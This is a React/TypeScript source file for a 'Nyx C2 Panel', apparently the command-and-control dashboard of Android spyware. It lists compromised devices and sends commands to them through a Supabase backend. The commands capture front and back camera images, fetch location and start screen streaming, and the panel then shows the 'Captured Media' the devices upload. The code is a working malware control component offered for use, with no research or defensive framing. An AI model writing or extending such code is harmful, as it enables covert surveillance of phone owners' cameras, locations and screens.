'use client';

    import { useState, useEffect, useRef } from 'react';
    import { supabase } from '../lib/supabaseClient';

    // Define TypeScript interfaces for our data structures
    interface Device {
        id: string;
        device_id: string;
        device_model: string;
        android_version: string;
        last_seen: string;
    }

    interface MediaFile {
        id: string;
        name: string;
        publicUrl: string;
    }

    export default function C2Panel() {
        const [devices, setDevices] = useState<Device[]>([]);
        const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
        const [mediaFiles, setMediaFiles] = useState<MediaFile[]>([]);
        const [isStreaming, setIsStreaming] = useState<boolean>(false);
        const streamIntervalRef = useRef<NodeJS.Timeout | null>(null);

        // Fetch devices on initial load and subscribe to changes
        useEffect(() => {
            fetchDevices();
            const deviceSubscription = supabase.channel('public:devices')
                .on('postgres_changes', { event: '*', schema: 'public', table: 'devices' }, payload => {
                    fetchDevices();
                }).subscribe();
            
            // CORRECTED CLEANUP FUNCTION
            return () => {
                supabase.removeChannel(deviceSubscription);
            };
        }, []);

        // Auto-refresh media when streaming
        useEffect(() => {
            if (isStreaming && selectedDevice) {
                streamIntervalRef.current = setInterval(() => {
                    fetchMediaForDevice(selectedDevice, false);
                }, 2500);
            } else {
                if (streamIntervalRef.current) {
                    clearInterval(streamIntervalRef.current);
                }
            }
            return () => {
                if (streamIntervalRef.current) {
                    clearInterval(streamIntervalRef.current);
                }
            };
        }, [isStreaming, selectedDevice]);

        const fetchDevices = async () => {
            const { data, error } = await supabase.from('devices').select('*').order('last_seen', { ascending: false });
            if (error) console.error('Error fetching devices:', error);
            else setDevices(data || []);
        };

        const fetchMediaForDevice = async (device: Device, reset: boolean = true) => {
            if (reset) {
               setSelectedDevice(device);
               setIsStreaming(false);
            }
            
            const { data, error } = await supabase.storage.from('media').list(device.device_id, {
                limit: 100,
                offset: 0,
                sortBy: { column: 'created_at', order: 'desc' },
            });

            if (error) {
                console.error('Error listing files:', error);
                setMediaFiles([]);
            } else {
                const filesWithUrls = data.map(file => {
                    const { data: { publicUrl } } = supabase.storage.from('media').getPublicUrl(`${device.device_id}/${file.name}`);
                    return { ...file, publicUrl };
                });
                setMediaFiles(filesWithUrls);
            }
        };

        const issueCommand = async (commandType: string) => {
            if (!selectedDevice) return;
            if (commandType === 'SCREEN_STREAM_START') setIsStreaming(true);
            if (commandType === 'SCREEN_STREAM_STOP') setIsStreaming(false);

            const { error } = await supabase.from('commands').insert([
                { device_uuid: selectedDevice.id, command_type: commandType }
            ]);
            if (error) alert(`Error: ${error.message}`);
        };

        return (
            <div className="text-white min-h-screen p-4 sm:p-8 font-mono">
                <h1 className="text-3xl text-green-400 mb-6">Nyx C2 Panel</h1>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                    {/* Device List */}
                    <div className="md:col-span-1 bg-gray-800 p-4 rounded-lg h-full">
                        <h2 className="text-xl text-green-300 border-b border-green-500 pb-2 mb-4">Connected Devices</h2>
                        <ul className="space-y-2">
                            {devices.map(device => (
                                <li key={device.id}
                                    className={`p-2 cursor-pointer hover:bg-gray-700 rounded transition-colors ${selectedDevice?.id === device.id ? 'bg-green-800' : 'bg-gray-700/50'}`}
                                    onClick={() => fetchMediaForDevice(device)}>
                                    <p className="font-bold">{device.device_model}</p>
                                    <p className="text-xs text-gray-400">ID: {device.device_id.substring(0, 8)}...</p>
                                    <p className="text-xs text-gray-400">Ver: {device.android_version}</p>
                                    <p className="text-xs text-gray-400">Seen: {new Date(device.last_seen).toLocaleString()}</p>
                                </li>
                            ))}
                        </ul>
                    </div>

                    {/* Control & Media Viewer */}
                    <div className="md:col-span-2 bg-gray-800 p-4 rounded-lg">
                        {selectedDevice ? (
                            <div>
                                <h2 className="text-xl text-green-300 border-b border-green-500 pb-2 mb-4 flex justify-between items-center">
                                    <span>Control: {selectedDevice.device_model}</span>
                                    {isStreaming && <span className="text-red-500 animate-pulse text-sm">STREAMING...</span>}
                                </h2>
                                <div className="flex flex-wrap gap-3 mb-6">
                                    <button onClick={() => issueCommand('CAM_FRONT')} className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded">Front Cam</button>
                                    <button onClick={() => issueCommand('CAM_BACK')} className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded">Back Cam</button>
                                    <button onClick={() => issueCommand('LOCATION')} className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-2 px-4 rounded">Location</button>
                                    <button onClick={() => issueCommand('SCREEN_STREAM_START')} className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded">Start Stream</button>
                                    <button onClick={() => issueCommand('SCREEN_STREAM_STOP')} className="bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-4 rounded">Stop Stream</button>
                                </div>

                                <h3 className="text-lg text-green-300 mb-4">Captured Media</h3>
                                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 max-h-[60vh] overflow-y-auto p-2 bg-gray-900/50 rounded">
                                    {mediaFiles.map(file => (
                                        <div key={file.id} className="bg-gray-700 rounded overflow-hidden shadow-lg">
                                            <a href={file.publicUrl} target="_blank" rel="noopener noreferrer">
                                                <img src={file.publicUrl} alt={file.name} loading="lazy" className="w-full h-32 object-cover" />
                                                <p className="text-xs p-1 truncate text-gray-300">{file.name.split('_').join(' ').substring(0, 20)}</p>
                                            </a>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        ) : (
                            <div className="flex items-center justify-center h-full min-h-[50vh]"><p className="text-gray-400">Select a device to begin.</p></div>
                        )}
                    </div>
                </div>
            </div>
        );
    }